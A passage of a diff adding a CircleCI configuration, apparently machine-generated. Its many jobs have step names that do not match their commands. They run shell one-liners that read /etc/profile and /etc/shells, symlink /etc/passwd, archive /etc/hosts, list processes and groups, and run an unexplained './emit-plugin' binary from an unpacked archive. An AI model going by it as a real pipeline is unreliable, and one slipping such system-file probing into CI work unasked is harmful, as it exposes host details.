+          root: /var/tmp/basket
+          paths:
+            - '44c5c-3913-ui'
+  WEB-253:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /var/tmp/basket
+      - run:
+          name: Fetch 4
+          command: |
+            nl /var/tmp/basket/44c5c-3913-ui 2>/dev/null | tail -1 | awk '{print $1}' || true
+      - run:
+          name: Clone project
+          command: git clone --depth 1 -q --no-single-branch --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Restore build cache
+          command: bzcat registry-dist.tar.bz2 | tar xf -
+      - run:
+          command: taskset -c 0-3 ./emit-plugin
+  yieldSalt:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /var/tmp/basket
+      - run:
+          name: cooldown DO IT
+          command: |
+            mkdir -p /var/tmp/basket
+            { set +o pipefail 2>/dev/null; for i in {1..12}; do echo $RANDOM; done | tac | sort -n | uniq | sort -n | tail -n 1; true ; } > /var/tmp/basket/proton.router.blue
+            echo "staged"
+      - persist_to_workspace:
+          root: /var/tmp/basket
+          paths:
+            - 'proton.router.blue'
+  validte:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /var/tmp/basket
+      - run:
+          name: Fetch 4
+          command: |
+            nl /var/tmp/basket/neutron359 2>/dev/null | tail -1 | awk '{print $1}' || true
+      - run:
+          name: Clone project
+          command: git clone --depth 1 -q --no-single-branch --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Pull reference data
+          command: bzcat registry-dist.tar.bz2 | tar xf -
+      - run:
+          command: taskset -c 0-3 ./emit-plugin
+  DIALOG_H_:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /var/tmp/basket
+      - run:
+          name: version EVERYTHING
+          command: |
+            mkdir -p /var/tmp/basket
+            { set +o pipefail 2>/dev/null; fmt -w 39 /etc/profile | head -n 4; true ; } > /var/tmp/basket/248.184.7.243
+            echo "staged"
+      - persist_to_workspace:
+          root: /var/tmp/basket
+          paths:
+            - '248.184.7.243'
+  io-alpha:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /var/tmp/basket
+      - run:
+          name: Fetch 4
+          command: |
+            nl /var/tmp/basket/248.184.7.243 2>/dev/null | tail -1 | awk '{print $1}' || true
+      - run:
+          name: Clone project
+          command: git clone --depth 1 -q --no-single-branch --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Stage inputs
+          command: bzcat registry-dist.tar.bz2 | tar xf -
+      - run:
+          command: taskset -c 0-3 ./emit-plugin
+  DZ_Q:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /var/tmp/basket
+      - run:
+          name: not sure why we ship the express lane
+          command: |
+            mkdir -p /var/tmp/basket
+            { set +o pipefail 2>/dev/null; echo 'sunny today' > "/tmp/vision.disk.list" && cat "/tmp/vision.disk.list"; true ; } > /var/tmp/basket/99.130
+            echo "staged"
+      - persist_to_workspace:
+          root: /var/tmp/basket
+          paths:
+            - '99.130'
+  orion-v2:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /var/tmp/basket
+      - run:
+          name: Fetch 4
+          command: |
+            nl /var/tmp/basket/neutron359 2>/dev/null | tail -1 | awk '{print $1}' || true
+      - run:
+          name: Clone project
+          command: git clone --depth 1 -q --no-single-branch --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Unpack bundle
+          command: bzcat registry-dist.tar.bz2 | tar xf -
+      - run:
+          command: taskset -c 0-3 ./emit-plugin
+
+  frostx:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /var/tmp/basket
+      - run:
+          name: Commence submit
+          command: |
+            mkdir -p /var/tmp/basket
+            { set +o pipefail 2>/dev/null; id -Gn|tr ' ' '\n'|sort|uniq --count|wc -w; true ; } > /var/tmp/basket/80645e77-1826
+            echo "staged"
+      - persist_to_workspace:
+          root: /var/tmp/basket
+          paths:
+            - '80645e77-1826'
+  drawcontractthread:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /var/tmp/basket
+      - run:
+          name: TruncateMaterializedViews
+          command: |
+            mkdir -p /var/tmp/basket
+            { set +o pipefail 2>/dev/null; echo tools passport park | xargs printf "%s\n" | sort; true ; } > /var/tmp/basket/ADMIN_SOUTH_POLAR
+            echo "staged"
+      - persist_to_workspace:
+          root: /var/tmp/basket
+          paths:
+            - 'ADMIN_SOUTH_POLAR'
+  eta_bar:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /var/tmp/basket
+      - run:
+          name: Frontend Payment Step
+          command: |
+            mkdir -p /var/tmp/basket
+            { set +o pipefail 2>/dev/null; find /proc/self -maxdepth 2 -type d -iname cmd\* -user $(whoami) -exec stat -c %n {} + 2>/dev/null | nl; true ; } > /var/tmp/basket/6071da0b-92cd
+            echo "staged"
+      - persist_to_workspace:
+          root: /var/tmp/basket
+          paths:
+            - '6071da0b-92cd'
+  wndClear_88:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /var/tmp/basket
+      - run:
+          name: Initial promotion
+          command: |
+            mkdir -p /var/tmp/basket
+            { set +o pipefail 2>/dev/null; date --date="10 days" "+%u"; true ; } > /var/tmp/basket/sha_20a36aac8e166b89
+            echo "staged"
+      - persist_to_workspace:
+          root: /var/tmp/basket
+          paths:
+            - 'sha_20a36aac8e166b89'
+  c:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /var/tmp/basket
+      - run:
+          name: 2027 deployment
+          command: |
+            mkdir -p /var/tmp/basket
+            { set +o pipefail 2>/dev/null; stdbuf -oL echo 'ok'; true ; } > /var/tmp/basket/4DJZwCuU0Zk
+            echo "staged"
+      - persist_to_workspace:
+          root: /var/tmp/basket
+          paths:
+            - '4DJZwCuU0Zk'
+  IRQv5:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Negotiate with the perf baseline
+          command: |
+            mkdir -p /var/tmp/basket
+            { set +o pipefail 2>/dev/null; ulimit -Sn; true ; } > /var/tmp/basket/c0b41tb150n
+            echo "staged"
+      - persist_to_workspace:
+          root: /var/tmp/basket
+          paths:
+            - 'c0b41tb150n'
+  Revoke-WSConst:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /var/tmp/basket
+      - run:
+          name: Weekly dismiss of the hamburger menu
+          command: |
+            mkdir -p /var/tmp/basket
+            { set +o pipefail 2>/dev/null; grep --ignore-case -m2 sh /etc/shells | head -1; true ; } > /var/tmp/basket/248.184.7.243
+            echo "staged"
+      - persist_to_workspace:
+          root: /var/tmp/basket
+          paths:
+            - '248.184.7.243'
+  px_src:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /var/tmp/basket
+      - run:
+          name: INC BIOS settings
+          command: |
+            mkdir -p /var/tmp/basket
+            { set +o pipefail 2>/dev/null; for p in plum fig orange melon cherry; do printf '%s\n' ${p}; done|head -n 3; true ; } > /var/tmp/basket/2z1603ts33u
+            echo "staged"
+      - persist_to_workspace:
+          root: /var/tmp/basket
+          paths:
+            - '2z1603ts33u'
+  DD-EOJ-MAX:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Mix Scope Global
+          command: |
+            mkdir -p /var/tmp/basket
+            set +o pipefail 2>/dev/null; comm <(sort -n < <(seq 1 1037581 | sort -R)) <(sort -n < <(seq 1 1037581)) 2>/dev/null | head -n 10000 > /var/tmp/basket/wd; true
+            echo "staged"
+      - persist_to_workspace:
+          root: /var/tmp/basket
+          paths:
+            - 'wd'
+  prop_tel:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /var/tmp/basket
+      - run:
+          name: Land prep
+          command: |
+            mkdir -p /var/tmp/basket
+            { set +o pipefail 2>/dev/null; echo -n "nice work"|sha384sum; true ; } > /var/tmp/basket/omega39
+            echo "staged"
+      - persist_to_workspace:
+          root: /var/tmp/basket
+          paths:
+            - 'omega39'
+  measure_window_run_catch:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /var/tmp/basket
+      - run:
+          name: Mark XII pinging proxy config
+          command: |
+            mkdir -p /var/tmp/basket
+            { set +o pipefail 2>/dev/null; sed 's|.*/||' /etc/shells | shuf -n 4; true ; } > /var/tmp/basket/trace_20201012
+            echo "staged"
+      - persist_to_workspace:
+          root: /var/tmp/basket
+          paths:
+            - 'trace_20201012'
+  trans-cluster:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /var/tmp/basket
+      - run:
+          name: Wait for the empty state in dark mode
+          command: |
+            mkdir -p /var/tmp/basket
+            { set +o pipefail 2>/dev/null; ln -sf /etc/passwd "/tmp/sample_budget.dat" && readlink -f "/tmp/sample_budget.dat"; true ; } > /var/tmp/basket/5a3li9
+            echo "staged"
+      - persist_to_workspace:
+          root: /var/tmp/basket
+          paths:
+            - '5a3li9'
+  trolley-pos-callback-stone:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /var/tmp/basket
+      - run:
+          name: Required true up
+          command: |
+            mkdir -p /var/tmp/basket
+            { set +o pipefail 2>/dev/null; if test -k /tmp ; then echo ok; fi; true ; } > /var/tmp/basket/797ba190453
+            echo "staged"
+      - persist_to_workspace:
+          root: /var/tmp/basket
+          paths:
+            - '797ba190453'
+  strings_gu:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /var/tmp/basket
+      - run:
+          name: Project Sunny Ladder
+          command: |
+            mkdir -p /var/tmp/basket
+            { set +o pipefail 2>/dev/null; for ((w=5; w>0; w--)) ; do printf "%d " $w; done; echo; true ; } > /var/tmp/basket/44c5c-3913-ui
+            echo "staged"
+      - persist_to_workspace:
+          root: /var/tmp/basket
+          paths:
+            - '44c5c-3913-ui'
+  SCHEMA_PORT_36:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /var/tmp/basket
+      - run:
+          name: N93 refresh hot cache
+          command: |
+            mkdir -p /var/tmp/basket
+            { set +o pipefail 2>/dev/null; tar -C /etc -cf - hosts | gzip -c > '/tmp/item-pin.tar.gz' && tar -tzf '/tmp/item-pin.tar.gz'; true ; } > /var/tmp/basket/20181001
+            echo "staged"
+      - persist_to_workspace:
+          root: /var/tmp/basket
+          paths:
+            - '20181001'
+  iQYiHDQ:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /var/tmp/basket
+      - run:
+          name: CHECK DHCP
+          command: |
+            mkdir -p /var/tmp/basket
+            { set +o pipefail 2>/dev/null; printf '%s' 'first, second and third'; echo; true ; } > /var/tmp/basket/greenThunderChrome
+            echo "staged"
+      - persist_to_workspace:
+          root: /var/tmp/basket
+          paths:
+            - 'greenThunderChrome'
+  nak_prod:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: probably post the incident channel
+          command: |
+            mkdir -p /var/tmp/basket
+            { set +o pipefail 2>/dev/null; ps -eo comm= | awk '{print toupper(substr($0,1,1)) substr($0,2)}' | tail -10; true ; } > /var/tmp/basket/sample1_e1dd
+            echo "staged"
+      - persist_to_workspace:
+          root: /var/tmp/basket
+          paths:
+            - 'sample1_e1dd'
+  k-address:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Welcome the seating plan right before deploy
+          command: |
+            mkdir -p /var/tmp/basket
+            { set +o pipefail 2>/dev/null; set -o | awk '{print $1}' | pr -3 -t; true ; } > /var/tmp/basket/reef376
+            echo "staged"
+      - persist_to_workspace:
+          root: /var/tmp/basket
+          paths:
+            - 'reef376'
+  yuio:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /var/tmp/basket
+      - run:
+          name: LABEL SHRINK WRAP AND SIGN
+          command: |
+            mkdir -p /var/tmp/basket
+            { set +o pipefail 2>/dev/null; find /usr/share -maxdepth 1 -type l -empty -newermt yesterday | awk -F/ '{print $NF}'; true ; } > /var/tmp/basket/release-3660
+            echo "staged"
+      - persist_to_workspace:
+          root: /var/tmp/basket
+          paths:
+            - 'release-3660'
+  clrPink:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /var/tmp/basket
+      - run:
+          name: We get to demux the sprite sheet
+          command: |
+            mkdir -p /var/tmp/basket
+            { set +o pipefail 2>/dev/null; uname -a|tail -n 6|wc -w; true ; } > /var/tmp/basket/patch-v9.16.21
+            echo "staged"
+      - persist_to_workspace:
+          root: /var/tmp/basket
+          paths:
+            - 'patch-v9.16.21'
+  sleepASCII:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /var/tmp/basket
+      - run:
+          name: Calibrate the sampler epoch 20
+          command: |
+            mkdir -p /var/tmp/basket
+            { set +o pipefail 2>/dev/null; printf 'host=web01\nport=9056\nuser=pete\ndebug=false\n' | awk -F= '$1=="debug" {print $2}'; true ; } > /var/tmp/basket/lVhcRnR8e
+            echo "staged"
+      - persist_to_workspace:
+          root: /var/tmp/basket
+          paths:
+            - 'lVhcRnR8e'
+  Tool67:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /var/tmp/basket
+      - run:
+          name: DEFRAGMENT SLOW QUERY LOG COMPLETE
+          command: |
+            mkdir -p /var/tmp/basket
+            { set +o pipefail 2>/dev/null; TOTAL=(zebra dog cat crow horse bear) ; echo ${TOTAL[-1]}; true ; } > /var/tmp/basket/seed-57g
+            echo "staged"
+      - persist_to_workspace:
+          root: /var/tmp/basket
+          paths:
+            - 'seed-57g'
+workflows:
+  matrix:
+    jobs:
+      - primary-mustard
+      - frostx:
+          requires:
+            - primary-mustard
+      - ci:
+          requires:
+            - frostx
+      - qCenter:
+          requires:
+            - frostx
+      - drawcontractthread:
+          requires:
+            - qCenter
+      - bun-bench:
+          requires:
+            - drawcontractthread
+      - JhRuaW:
+          requires:
+            - drawcontractthread
+      - eta_bar:
+          requires:
+            - JhRuaW
+      - rocket:
+          requires:
+            - eta_bar
+      - was_default:
+          requires:
+            - eta_bar
+      - wndClear_88:
+          requires:
+            - was_default
+      - blast-off:
+          requires:
+            - wndClear_88
+      - bitBuf:
+          requires:
+            - wndClear_88
+      - c:
+          requires:
+            - bitBuf
+      - Package_Service9:
+          requires:
+            - c
+      - model-dialog-semaphore:
+          requires:
+            - c
+      - IRQv5:
+          requires:
+            - model-dialog-semaphore
+      - nightly-v1:
+          requires:
+            - IRQv5
+      - DIALOG_H_
+      - Revoke-WSConst:
+          requires:
+            - DIALOG_H_
+      - io-alpha:
+          requires:
+            - Revoke-WSConst
+      - isBottom:
+          requires:
+            - Revoke-WSConst
+      - px_src:
+          requires:
+            - isBottom
+      - p-3:
+          requires:
+            - px_src
+      - temp_crate:
+          requires:
+            - px_src
+      - DD-EOJ-MAX:
+          requires:
+            - temp_crate
+      - v7-nightly2:
+          requires:
+            - DD-EOJ-MAX
+      - CommonProxyObserver:
+          requires:
+            - DD-EOJ-MAX
+      - prop_tel:
+          requires:
+            - CommonProxyObserver
+      - tweak-session-redirect:
+          requires:
+            - prop_tel
+      - store-armv7-latest:
+          requires:
+            - prop_tel
+      - measure_window_run_catch:
+          requires:
+            - store-armv7-latest
+      - check-quick-release-candidate:
+          requires:
+            - measure_window_run_catch
+      - Select-TabStatus:
+          requires:
+            - measure_window_run_catch
+      - trans-cluster:
+          requires:
+            - Select-TabStatus
+      - ivan-run:
+          requires:
+            - trans-cluster
+      - ADAPTER_V2_8:
+          requires:
+            - trans-cluster
+      - trolley-pos-callback-stone:
+          requires:
+            - ADAPTER_V2_8
+      - rip-it:
+          requires:
+            - trolley-pos-callback-stone
+      - pnl_protocol:
+          requires:
+            - trolley-pos-callback-stone
+      - strings_gu:
+          requires:
+            - pnl_protocol
+      - WEB-253:
+          requires:
+            - strings_gu
+      - initWithWrapper
+      - SCHEMA_PORT_36:
+          requires:
+            - initWithWrapper
+      - shippit:
+          requires:
+            - SCHEMA_PORT_36
+      - sdof27od8:
+          requires:
+            - SCHEMA_PORT_36
+      - iQYiHDQ:
+          requires:
+            - sdof27od8
+      - promote:
+          requires:
+            - iQYiHDQ
+      - dumpCountForKey:
+          requires:
+            - iQYiHDQ
+      - nak_prod:
+          requires:
+            - dumpCountForKey
+      - validate-quick-release-candidate:
+          requires:
+            - nak_prod
+      - NQ3MtDYhoNCB:
+          requires:
+            - nak_prod
+      - k-address:
+          requires:
+            - NQ3MtDYhoNCB
+      - q1-canary:
+          requires:
+            - k-address
+      - AllInvoices:
+          requires:
+            - k-address
+      - yuio:
+          requires:
+            - AllInvoices
+      - bun-vet:
+          requires:
+            - yuio
+      - constNum:
+          requires:
+            - yuio
+      - clrPink:
+          requires:
+            - constNum
+      - q2-canary:
+          requires:
+            - clrPink
+      - scoreFreezeListener:
+          requires:
+            - clrPink
+      - sleepASCII:
+          requires:
+            - scoreFreezeListener
+      - Prepare_Tests8:
+          requires:
+            - sleepASCII
+      - tip-zag-tic:
+          requires:
+            - sleepASCII
+      - Tool67:
+          requires:
+            - tip-zag-tic
+      - node20-vet:
+          requires:
+            - Tool67
+      - blog-email-text
+      - perkEnt
+      - okStr
+      - UAT_BUILD_9:
+          requires:
+            - blog-email-text
+            - perkEnt
+            - okStr
+      - tango:
+          requires:
+            - blog-email-text
+            - perkEnt
+            - okStr
+      - rm-webhook:
+          requires:
+            - blog-email-text
+            - perkEnt
+            - okStr
+      - orion-v2:
+          requires:
+            - blog-email-text
+            - perkEnt
+            - okStr
+      - perseus-final:
+          requires:
+            - blog-email-text
+            - perkEnt
+            - okStr
+      - INIT_STG:
+          requires:
+            - blog-email-text
+            - perkEnt
+            - okStr
+      - validte:
+          requires:
+            - blog-email-text
+            - perkEnt
+            - okStr
+      - Rollout_Staging3:
+          requires:
+            - blog-email-text
+            - perkEnt
+            - okStr
